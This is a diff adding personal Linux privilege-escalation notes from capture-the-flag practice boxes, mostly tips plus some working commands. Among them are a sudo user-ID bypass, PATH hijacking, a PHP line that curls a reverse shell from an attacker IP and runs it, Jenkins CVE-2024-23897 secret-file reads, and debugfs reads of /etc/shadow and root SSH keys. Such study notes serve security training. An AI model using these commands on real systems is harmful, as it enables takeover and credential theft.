@@ -1,0 +1,86 @@
+
+	1. There are many ways to exploit sudo wget. Check the notes.
+	2. Linux 2.6.22 < 3.9  --->  Dirty cow. --->  gcc -pthread dc.c -o c -lcrypt
+	3. Lxd/Lxc -->  new privilege escalation technique learned.  --> (Refer Tabby)
+	4. When acquired a shell and want to privesc horizontally try to use every found passwords on the new users. E.g. Passwords found before the initial access or from database file after getting the initial access.
+	5. Sudo 1.8.25 vulnerable  -->   sudo -u#-1 /bin/bash
+	6. Always check whether the "sudo -l" output contain secure_path or other variables or not e.g. LD_PRELOAD, etc. If secure_path is not given, "export PATH=/tmp:$PATH" and put your malicious binary in the /tmp folder and then run the sudo binary. So, Check if all variables are given in 'sudo -l' such as secure_path, LD_PRELOAD, etc.
+	7. Prefer ssh over netcat if username and password is found.
+	8. Always check the doubtful vector of privesc very carefully.
+	9. Learn about new binaries from the GTFOBins. Don't hesitate about searching it on a web.
+	10. GTFOBins  tells us that journalctl is a binary which shows the output in a less format if the lines exceeds to 5 lines. 
+	11. If Sudo nginx -->  Privesc --->  Refer Broker HTB. There are three ways.
+	12. Always check for unknown SUID binaries for the privesc because those can be the strong vector to get the root shell.
+	13. Also try to search exploit for those unknown SUID binaries in the exploit-DB or on GitHub. Try to find out the version of that binary. If not found, try using any exploit irrespective of its version.
+	14. Acl.sh linux Privesc -->  Linux access control list getfacl & setfacl  --->  Refer PermX HTB.
+	15. We can also get PHP file from our Kali and pipe it over to PHP to run it. We can put that in a file running as a root.  
+	--->   echo "<?php system('curl http://10.10.14.31:8000/rev-shell.php | php') ?>" > artisan
+	16. Vnc runs on those ports especially 5901 port. VNC is similar to remote desktop protocol but instead it gives us a shell rather than an GUI access to the system. Privesc (Poison)
+	17. Knockd -->  HTB Nineveh
+	18. If write permissions allowed on file /etc/passwd  -->  create a password using -->  openssl passwd -1 0xdf
+	19. Linux kernel version 2.6.31 -->  Vulnerable to Dirty cow exploit. Use Firefart Dirty cow one.
+	20. If the vim permission is given as a root, it can be used to view and modify the /etc/passwd  and /etc/shadow
+	This means we can put our hashes into the root field or a same user as a root and log in.
+	21. If a file containing sudo privileges is calling another normal file, then the other file will also be executed/run with sudo privileges.
+	22. For pkexec and pkttyagent privesc --> (ROAD THM)
+	23. Listing content of /etc/fstab and all mounted drives:  cat /etc/fstab  --->  Sometimes contain username and its password. Although try that password with other users also.
+	24. If reboot system privs given (sudo -l), then we have to check whether do we have any writable permitted system file that ends with the extension of '.service'. If yes, change the "ExecStart" field with our malicious payload. (Zeno THM)
+	25. If find any unfamiliar binary in "sudo -l" or SUID, just run strings, strace, ltrace on it. It might reveal some pathless binaries that we can hijack or may show the hard coded passwords. (Blackgate PG)
+	26. Linux privesc -->  Always check the sudo versions. Search on Google every time.
+	27. If any exploits for any application or binary are found, just try executing them even the versions are not matching. Last Resort.
+	28. Here, I did not have sudo privileges as a normal user but there was a way that I could get a www-data rev shell from the victims machines by uploading the PHP reverse shell and the www-data user had sudo ALL privileges. So it's better to check every user's privileges. To get an better idea, check which user is in sudo group. We need to privesc as that user. (Relia)
+	29. Biggest learning: Wherever get any unknown sudo perm or suid. Try to read their document, search for it's new_binary.conf file in the system using "find / -name new_binary.conf 2>/dev/null" and try to execute every command they have to test how you can use it to get root.
+	30. If linpeas generates too much possible privesc output (like red highlighted texts), narrow down the vectors and prioritize based on your experience.
+	31. There might be scenario like if the current user doesn't have much privileges then you will need to escalate to other user and look from there. Here user chloe was in sudo group so needed to get to her.
+	32. I found three backups files, but first two of them didn't open but third one was password protected. Used zip2john and looked into configuration files. Found user's password.
+	33. Always search exploits for linux kernel version even if linpeas doesn't shows it highlighted. Linux kernel version 5.9.0 is vulnerable to dirtypipe exploit.
+	34. For crontab  --->  cat /etc/cron.d/*
+	35. After initial access, run "ps aux" to check which services are running as root. If mysqld is running as a root, check its version. MySql 5.7 is vulnerable.  (Pebbles PG)
+	36. Linux version 2.6.32-21-generic  -->  Dirty-Cow
+	37. After running cron file, sudo file or SUID file if any .so file is not found (utils.so) then create utils.c and compile it -->   gcc -shared -o utils.so -fPIC utils.c   (Refer Sybaris for C code)
+	38. Always try found password to login as a root user. The root's password turned out to be same as login portal's password ---->   'thedoctor'  (Apex PG)
+	39. Always run pspy64 after the linpeas.sh   (Flu)
+	40. Root was running /opt/log-backup.sh which was created by user conflunce itself so we could edit it. Try not to overwrite the script because sometimes it may not run if initial words/commands are not found in the script.
+	41. Go through the output of linpeas carefully - line by line.  (Payday)
+	42. See if we can go into the root's directory. Never forget it. If yes, there might be something that helps us gain a shell. Here, I found a capture.cap file, which is a Wireshark file. Unfortunately, the credentials it provided were of no use. Generally we can't list out the files inside root directory. But this time it was disclosed deliberately. (Payday) To check this refer to "Files inside others home (limit 20)" section from linpeas output.   (Payday PG)
+	43. Whenever you get logged in as a www-data user, to escalate privilege to the actual user from the home directory, NEVER EVER FORGET TO TRY THAT USER'S NAME AS A PASSWORD. Trust me, it won't let you down sometimes, when most of the things have been looked and you feel helpless. It worked on this box and I was trying to find it elsewhere. It's so dumb of me. Never-mind. Learned a lesson. 
+	44. If you have a password, always try to use it on different user's accounts. Here, I found the password in config.php file and that password was reused for root too.  (Codo PG)
+	45. Always check 'sudo -l' and some basic checks before performing linpeas.
+	46. If there is a sudo on one binary, check its length and always cat it and run strings on it.
+	47. If the exploit let us read and write over the system as a root, we can cat /etc/passwd and create a new user with root console with our password and overwrite /etc/passwd and then SSH.
+	48. Learned capabilities privesc for python3
+	49. If the another user can run sudo but the current one cannot, need to escalate to that another user first.
+	50. Read the GTFOBins carefully. See what can we do with it. For more info read this box's privesc section where we exploited the composer binary.  (LaVita PG)
+	51. Check this field in the linpeas.sh -->  Interesting writable files owned by me or writable by everyone (not in Home)
+	52. /usr/bin/make -->  privesc -->  Makefile or GTFOBins
+	https://medium.com/@hackerfate04/spx-offsecpg-walkthrough-765be7d9a717
+	https://www.youtube.com/watch?v=XF_CaQrH7-M
+	53. Jenkins 2.401.2  (Jenkins jobs are executed with high privileges by default)
+	
+		A. CVE-2024-23897  --->  it lets us read any files
+		B. Used 51993.py from the exploit-db
+		--->   python3 51993.py -u http://127.0.0.1:8088/ -p /etc/passwd
+		OR  -->  wget http://localhost:8080/jnlpJars/jenkins-cli.jar
+		       -->  java -jar jenkins-cli.jar -s http://localhost:8080 -http help 1 "@//root/.jenkins/secrets/initialAdminPassword"
+		C. In config.xml file -->  where admin password is stored is given -->  /root/.jenkins/secrets/initialAdminPassword
+		-->  <InitialRootPassword>/root/.jenkins/secrets/initialAdminPassword></InitialRootPassword>
+		D. --->   python3 51993.py -u http://127.0.0.1:8088/ -p /root/.jenkins/secrets/initialAdminPassword
+		E. Login Jenkins Or create a user -->  Manage Jenkins  -->  Scroll Down  -->  Script Console  -->  Groovy Script from revshells  -->  netcat connection
+	54. Whenever see a wildcards (*) in the cron jobs, be it Tar, Rsync, 7z, Zip -->  always refer to hacktricks: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html
+	55. Check /opt directory manually.
+	56. Disk linux group privilege escalation. -->  https://www.hackingarticles.in/disk-group-privilege-escalation/
+	--->   find / -group disk 2>/dev/null
+	--->   df -h
+	Select disk which hash been mounted on root directory. 
+	--->   debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+	--->   mkdir test         ---->(Check permission)
+	--->   cat /root/.ssh/id_rsa
+	--->   cat /etc/shadow          ---->(Crack offline using John or Hashcat)
+	57. Check this field in the linpeas.sh -->  Interesting writable files owned by me or writable by everyone (not in Home)
+	58. Unknown SUID binary? Search Google for its privesc.
+	59. If you find root keys, try to log in from a victim's shell itself with 127.0.0.1 IP.  -->  ssh -i root root@127.0.0.1
+	60. Try user's SSH keys with the root.
+	61. If the code is given for privilege escalation, check its libraries/packages on Google whether they are vulnerable or not. If the code is the privesc vector then it is more likely vulnerable irrespective of the programming language used to write a code such as python, javascript (node), etc. e.g. happy_dom (CVE-2024-51757) from node.js
+	62. For Javascript reverse shell, check WallpaperHub box.
+	63. Check the version of the unknown SUID binary. In this case /opt/fileS it turned out to be duplicate of find binary.
+	
